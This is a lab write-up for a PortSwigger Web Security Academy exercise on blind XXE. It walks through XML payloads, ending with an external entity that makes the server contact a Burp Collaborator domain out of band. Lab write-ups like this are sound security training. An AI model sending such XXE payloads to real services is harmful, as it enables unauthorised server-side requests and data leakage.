---
title: 'Lab: Blind XXE with out-of-band interaction'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/XXE/Blind XXE"
---

# Lab: Blind XXE with out-of-band interaction
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab has a "Check stock" feature that parses XML input but does not display the result.
You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
* Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
* Hint:

## [Background](https://portswigger.net/web-security/xxe/blind)
> 有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：
>
>您可以觸發out-of-band網絡交互，有時會在交互數據中泄露敏感數據。
>您可以通過錯誤消息包含敏感數據的方式觸發 XML 解析錯誤。

## Recon
1. Declare a new entity and reference it
    :::spoiler Payload
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe "test"> ]>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    :::
    ![](https://hackmd.io/_uploads/BJpoMFLE2.png)
    As the result above, it seems can accept a new entity, then we can use it in `xml`
    
    ---
    :::spoiler Payload
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe "test"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    :::
    ![](https://hackmd.io/_uploads/HkO4QYUEn.png)

2. So..., we can use out-of-band server try to leak some information


## Exp
1. Use Burp Collaborator
![](https://hackmd.io/_uploads/Sk3lDtIVh.png)
And copy the collaborator's payloads
    :::spoiler Payload
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://s92t6q0ljljd7fttguns4mrdy44wsl.burpcollaborator.net"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    :::
    
2. Result
    ![](https://hackmd.io/_uploads/S1W7YKIV3.png)

:::spoiler Success Screenshot
![](https://hackmd.io/_uploads/r13iWF84h.png)
:::

## Reference
[Lab: Blind XXE with out-of-band interaction](https://www.cnblogs.com/Zeker62/p/15190054.html)
[XXE Lab Breakdown: Blind XXE with out-of-band interaction](https://youtu.be/T3eo0CtYzYo)